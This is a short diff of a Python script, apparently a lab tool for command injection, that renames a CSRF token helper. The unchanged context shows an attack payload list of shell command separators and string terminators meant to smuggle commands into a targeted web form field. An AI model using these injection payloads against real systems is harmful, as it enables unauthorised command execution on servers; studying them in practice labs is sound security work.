@@ -7,8 +7,8 @@ import sys
 import re
 import itertools
 
-# Get csrf from website
-def get_csrf(session):
+# Get csrf token from website
+def get_csrf_token(session):
     resp = session.get(form_url)
     csrf_token = re.search(r'name="csrf" value="(.*)"', resp.text).group(1)
     return csrf_token
@@ -40,7 +40,7 @@ payload = ['|', '||', '&', '&&', ';', '%0a', '#', '`', '\n']
 start_str = ['', '\'', '"'] # In case the field we are attacking is fed into a string, we must first terminate the string before executing our command
 
 sess = requests.Session()
-csrf = get_csrf(sess)
+csrf = get_csrf_token(sess)
 
 
 for start in start_str:
